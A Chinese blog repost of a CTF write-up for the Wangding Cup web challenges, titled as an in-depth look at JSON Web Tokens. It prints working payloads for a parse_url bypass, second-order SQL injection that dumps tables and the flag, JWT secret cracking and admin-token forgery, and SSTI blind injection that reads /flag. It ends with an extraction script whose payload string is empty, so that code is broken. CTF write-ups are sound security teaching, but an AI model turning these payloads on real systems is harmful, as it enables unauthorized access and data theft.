---
layout:     post
title:      深入了解Json Web Token
date:       2018-12-16
author:     Wh0ale
header-img: img/wallhaven-714676.jpg
catalog: true
tags:
    - JWT
---



通过赛题深入了解JWT

比赛环境没关，可以找其他人借账号复现本次比赛题目，以下是网鼎杯第三场Web题解。

## Web

### comein

题目：由于运维人员失误，内网认证页面部署至了外网，不过还好，开发加了域名验证。

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7f747460-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7f747460-aac0-1.png)

查看源码，发现如下代码：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7f9837e2-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7f9837e2-aac0-1.png)

很明显又是考察 **parse_url** 函数绕过，只不过开头多了对点号的匹配，绕过即可。使用 **payload**：**.@c7f.zhuque.com/..//**

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7fa83c50-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7fa83c50-aac0-1.png)

可以自己本地调试一下。

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7fbe7394-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7fbe7394-aac0-1.png)

### gold

题目：还在上小学的小明同学开发了一款游戏，你能通关吗？

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7fcab622-aac0-1.gif)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204718-7fcab622-aac0-1.gif)

**Burpsuite** 抓包会发现浏览器一直发送POST数据，应该是通过Ajax来发起请求的：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-7fe7503e-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-7fe7503e-aac0-1.png)

根据题目提示： **收集1000金币即可过关** 。尝试直接将参数 **getGod** 的值修改为1000，发现会触发检测机制。

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-7ffb2f50-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-7ffb2f50-aac0-1.png)

于是使用 **Burpsuite** 抓包，用 **Intruder** 模块从0跑到1001，在 **getGod=1001** 的数据包中获得flag：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-800dba30-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-800dba30-aac0-1.png)

PS：用多线程跑会触发游戏的反作弊机制，用单线程按顺序跑就能出flag。

### phone

题目：find the flag.

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-801a9444-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-801a9444-aac0-1.png)

看到这道题目，马上就想到 [2017广东省强网杯(第三题)](https://mochazz.github.io/2017/09/11/QWBCTF/) 。测试了一下，果然在用户注册处的电话处存在二次注入，测试结果如下：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-802de544-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-802de544-aac0-1.png)

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-803ad272-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-803ad272-aac0-1.png)

可以发现这里查询结果为： **有1人和你电话相似哦~** ，而实际上这是我注册的第一个用户，数据库中不可能有用户的电话和我一样，所以应该是执行了我们刚刚构造的 **SQL语句** ，因为后面的布尔逻辑值为真。所以我们分别构造获取表名、列名、字段的 **payload** 如下：

获取表名：

```
aaa' union select group_concat(table_name) from information_schema.tables where table_schema=database() order by 1 desc#
username=test4&password=test4&phone=0x6161612720756e696f6e2073656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d64617461626173652829206f726465722062792031206465736323&register=Login
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-80470538-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-80470538-aac0-1.png)

获取列名：

```
aaa' union select group_concat(column_name) from information_schema.columns where table_name="flag" order by 1 desc#
username=test6&password=test6&phone=0x6161612720756e696f6e2073656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f6e616d653d22666c616722206f726465722062792031206465736323&register=Login
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-80525c6c-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-80525c6c-aac0-1.png)

获取字段：

```
aaa' union select f14g from flag order by 1 desc#
username=test7&password=test7&phone=0x6161612720756e696f6e2073656c65637420663134672066726f6d20666c6167206f726465722062792031206465736323&register=Login
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-805e9004-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-805e9004-aac0-1.png)

这里可能有人会不明白为什么要加上 **order by 1 desc** ，大家可以试试下面这个 **payload** ：

```
aaa' union select group_concat(table_name) from information_schema.tables where table_schema=database()#
username=test8&password=test8&phone=0x6161612720756e696f6e2073656c6563742067726f75705f636f6e636174287461626c655f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573207768657265207461626c655f736368656d613d6461746162617365282923&register=Login
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-806b2e68-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204719-806b2e68-aac0-1.png)

实际上后台的 **SQL语句** 类似下图 **第一个SQL语句** ：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80b028a6-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80b028a6-aac0-1.png)

### i_am_admin

题目：你能登录进去吗？

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80c261e2-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80c261e2-aac0-1.png)

抓取登录数据包，发现 **JWT** ：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80d6d6fe-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80d6d6fe-aac0-1.png)

登录进去可以发现用于加密的 **secret key** ：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80e54720-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80e54720-aac0-1.png)

使用这个 **secret key** 到 <https://jwt.io/> 生成 **admin** 对应的 **token** 值：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80fa7a8c-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204720-80fa7a8c-aac0-1.png)

使用该 **token** 值访问网站即可获得flag：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-810e6da8-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-810e6da8-aac0-1.png)

### mmmmy

题目：find the flag.

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-811c4b6c-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-811c4b6c-aac0-1.png)

抓包发现又是python的web程序，使用了JWT：(随手用test/test登录即可看到)

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-8137b456-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-8137b456-aac0-1.png)

使用 [**c-jwt-cracker**](https://github.com/brendan-rius/c-jwt-cracker) 爆破 **secret key** ：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-81564a60-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-81564a60-aac0-1.png)

发现只有 **admin** 才能用留言板功能，所以 **伪造admin的token** 登录：

![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-816bdcfe-aac0-1.png)

**virink** 师傅提醒说留言板处存在 **SSTI** ，于是测试了下，果然存在，只不过过滤了 **{{}}** 的写法，那我们可以换成流程控制结构的写法 **{%if 表达式%}内容1{%else%}内容2{%endif%}** ，测试如下：

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-817c1b0a-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-817c1b0a-aac0-1.png)

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-818af3e6-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-818af3e6-aac0-1.png)

那么后面的数据就要盲注出来了，使用的 **payload** 类似如下:

```
text={%  if open('/flag','r').read()[0]=='f' %}1{%  else  %}0{%  endif  %}
```

这里实际上过滤了单、双引号，我们可以使用以下payload进行绕过：

```
text={% if request.values.e[18] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[0]%}good{%endif%}&a=__class__&b=__base__&c=__subclasses__&d=/flag&e=}-{0123456789abcdefghijklmnopqrstuvwxyz
```

[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-81995b8e-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204721-81995b8e-aac0-1.png)

getflag程序如下：

```python
import requests,sys
url = "http://4532bc69bc734acd8416204f0aa04f446e9d38024c5644e8.game.ichunqiu.com/bbs"
cookie = {
    "token" : "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.IXEkNe82X4vypUsNeRFbhbXU4KE4winxIhrPiWpOP30"
}
chars = "}-{0123456789abcdefghijklmnopqrstuvwxyz"
flag = ''
for i in range(0,50):
    for j in range(0,len(chars)):
        data = {
            "text" : "" % (j,i),
            "a" : "__class__",
            "b" : "__base__",
            "c" : "__subclasses__",
            "d" : "/flag",
            "e" : chars
        }
        r = requests.post(url=url,data=data,cookies=cookie)
        if 'getflag' in r.text:
            flag += chars[j]
            sys.stdout.write("[+] "+ flag + '\r')
            sys.stdout.flush()
            if chars[j] == '}':
                print(flag)
                exit()
            else:
                break
print(len(r.text))
```



[![img](https://xzfile.aliyuncs.com/media/upload/picture/20180828204722-81aa70fe-aac0-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20180828204722-81aa70fe-aac0-1.png)



转载自先知：https://xz.aliyun.com/t/2648

[深入了解Json Web Token之概念篇](https://www.freebuf.com/articles/web/180874.html)

[深入了解Json Web Token之实战篇](https://www.freebuf.com/articles/web/181261.html)

https://jwt.io/